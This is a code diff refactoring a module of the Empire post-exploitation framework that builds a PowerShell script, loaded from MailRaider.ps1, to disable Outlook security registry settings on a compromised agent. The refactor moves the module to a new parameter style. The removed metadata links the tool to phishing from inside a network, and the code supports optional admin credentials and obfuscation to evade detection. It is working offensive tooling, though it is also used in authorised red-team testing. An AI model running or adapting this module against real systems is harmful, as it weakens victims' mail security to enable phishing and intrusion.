@@ -1,128 +1,56 @@
 from __future__ import print_function
 
-from builtins import object
 from builtins import str
-
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Disable-SecuritySettings',
-
-            'Author': ['@xorrior'],
-
-            'Description': ("This function checks for the ObjectModelGuard, PromptOOMSend, and AdminSecurityMode registry keys for Outlook security. This function must be "
-                            "run in an administrative context in order to set the values for the registry keys."),
-
-            'Software': '',
-
-            'Techniques': ['T1047'],
-
-            'Background' : True,
-
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : False,
-
-            'OpsecSafe' : True,
-            
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
-            
-            'Comments': [
-                'https://github.com/xorrior/EmailRaider',
-                'http://www.xorrior.com/phishing-on-the-inside/'
-            ]
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'AdminUser' : {
-                'Description'   :   'Optional AdminUser credentials to use for registry changes.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'AdminPassword' : {
-                'Description'   :   'Optional AdminPassword credentials to use for registry changes.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Version' : {
-                'Description'   :   'The version of Microsoft Outlook.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Reset' : {
-                'Description'   :   'Switch. Reset security settings to default values.',
-                'Required'      :   False,
-                'Value'         :   ''
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         
-        moduleName = self.info["Name"]
-        reset = self.options['Reset']['Value']
+        module_name = 'Disable-SecuritySettings'
+        reset = params['Reset']
 
         # read in the common powerview.ps1 module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/management/MailRaider.ps1"
+        module_source = main_menu.installPath + "/data/module_source/management/MailRaider.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
-            f = open(moduleSource, 'r')
+            f = open(module_source, 'r')
         except:
-            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
             return ""
 
-        moduleCode = f.read()
+        module_code = f.read()
         f.close()
 
-        script = moduleCode + "\n" 
-        scriptEnd = ""
+        script = module_code + "\n"
+        script_end = ""
         if reset.lower() == "true":
             # if the flag is set to restore the security settings
-            scriptEnd += "Reset-SecuritySettings "
+            script_end += "Reset-SecuritySettings "
         else:
-            scriptEnd += "Disable-SecuritySettings "
+            script_end += "Disable-SecuritySettings "
 
-        for option,values in self.options.items():
+        for option,values in params.items():
             if option.lower() != "agent" and option.lower() != "reset":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
+                if values and values != '':
+                    if values.lower() == "true":
                         # if we're just adding a switch
-                        scriptEnd += " -" + str(option)
+                        script_end += " -" + str(option)
                     else:
-                        scriptEnd += " -" + str(option) + " " + str(values['Value']) 
+                        script_end += " -" + str(option) + " " + str(values)
 
-        scriptEnd += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
+        script_end += ' | Out-String | %{$_ + \"`n\"};"`n'+str(module_name)+' completed!"'
 
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
-        script += scriptEnd
+            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
+        script += script_end
         script = helpers.keyword_obfuscation(script)
 
         return script
